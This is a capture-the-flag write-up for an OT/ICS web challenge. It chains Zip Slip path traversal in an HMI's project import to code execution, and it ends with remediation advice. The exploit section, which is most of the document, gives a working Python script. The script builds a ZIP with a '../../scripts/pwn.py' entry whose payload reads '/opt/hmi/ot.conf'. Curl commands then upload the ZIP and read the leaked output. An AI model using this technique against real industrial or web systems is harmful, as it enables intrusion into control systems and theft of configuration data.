# Reentry Bay 1/5 — Deorbit HMI

**Flag:** `reentry{z1p_sl1p_d3pl0y3d_th3_hm1_pr0j3ct}`

| | |
|---|---|
| Category | OT/ICS · Web · Zip Slip → RCE |
| Targets (per-instance) | HMI `https://<instance>-bay-access-8000.http.reentry.lol`, plus sequencer/OPC-UA/Modbus over `tcp.reentry.lol:<port>` (offline now) |
| Files | none (archives are uploaded to the HMI) |

> **Challenge brief:** The bay's HMI runtime still imports project archives exported by the original
> commissioning toolchain, and it still unpacks them the way that toolchain expected — which is to
> say, wherever the archive says they go. Anything the runtime finds sitting in its screen-script
> path gets evaluated on the next scan. Get the segment's configuration.

Two sentences = two bugs chained:
- *"wherever the archive says they go"* → the archive is unpacked **without path validation** =
  **Zip Slip** (path traversal via ZIP entry names).
- *"screen-script path gets evaluated"* → files in the screen-script directory are **executed** by
  the runtime.

Together: upload a ZIP whose entry "escapes" the project directory into the runtime's script
directory, and the runtime runs our code on the next scan — **RCE**.

---

## Exploit

```bash
export BASE="https://<your-instance>-bay-access-8000.http.reentry.lol"

# 1) Build a ZIP with an entry that escapes to the runtime's script path (/opt/hmi/scripts)
python3 - <<'PY'
import zipfile
payload = (
    'import subprocess\n'
    'out = subprocess.run(["cat","/opt/hmi/ot.conf"],capture_output=True,text=True)\n'
    'raise Exception("\\n"+out.stdout+out.stderr)\n'   # dump the config via the diagnostics log
)
with zipfile.ZipFile("exploit.zip","w",zipfile.ZIP_DEFLATED) as z:
    z.writestr("../../scripts/pwn.py", payload)   # <-- Zip Slip: ../../ -> /opt/hmi/scripts/
PY

# 2) Import the archive
curl -sS -F "project=@exploit.zip;type=application/zip" "$BASE/project/import" >/dev/null

# 3) Read the result from the diagnostics log (the runtime logs the full traceback)
sleep 4; curl -sS "$BASE/diagnostics" | tail -n 25
```

The output contains `/opt/hmi/ot.conf`, which holds:

```
flag        = reentry{z1p_sl1p_d3pl0y3d_th3_hm1_pr0j3ct}
```

🚩 **Flag:** `reentry{z1p_sl1p_d3pl0y3d_th3_hm1_pr0j3ct}`

> **Note:** The instance is offline now (event closed), so this cannot be re-run. The output of the
> RCE (`/opt/hmi/ot.conf`) is also the recon source that maps the OT network (Modbus / OPC-UA /
> sequencer ports) used by stages 2–5.

---

## Why it works / remediation

- **Zip Slip:** never trust entry names in an archive. Before writing each entry, resolve the final
  path and verify it stays inside the intended extraction directory (reject `..` and absolute
  paths).
- **Code execution from a data directory:** a runtime that evaluates any file dropped in its script
  path turns a file-write primitive into RCE. Separate uploaded data from executable content.

> **Next:** [2 - Thruster Telemetry](2%20-%20Thruster%20Telemetry.md)
